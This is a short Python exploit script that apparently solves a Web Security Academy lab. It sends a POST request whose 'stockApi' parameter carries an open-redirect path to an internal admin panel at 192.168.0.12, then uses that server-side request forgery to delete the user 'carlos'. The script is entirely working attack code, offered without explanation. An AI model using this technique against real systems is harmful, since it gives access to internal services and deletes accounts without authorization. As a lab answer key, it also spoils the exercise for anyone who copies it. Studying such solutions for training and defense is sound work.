#!/usr/bin/python3

import requests
import sys

def connect(url, endpoint, redirect):

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }

    data = {
        "stockApi": redirect,
    }

    r = requests.post(url + endpoint, data=data, headers=headers)

    if "Admin panel" in r.text:
        deleteUser = "/delete?username=carlos"

        data = {
            "stockApi": redirect + deleteUser,
        }

        r = requests.post(url + endpoint, data=data, headers=headers)
        print(r.text)
    else:
        print("[ERROR] Something went wrong!")
        sys.exit(1)

    
if __name__ == '__main__':

    url = "https://ac811f1b1fde28e6c0706b8400eb00d6.web-security-academy.net"
    endpoint = "/product/stock"
    
    redirect = "/product/nextProduct?path=http://192.168.0.12:8080/admin"
    
    connect(url, endpoint, redirect)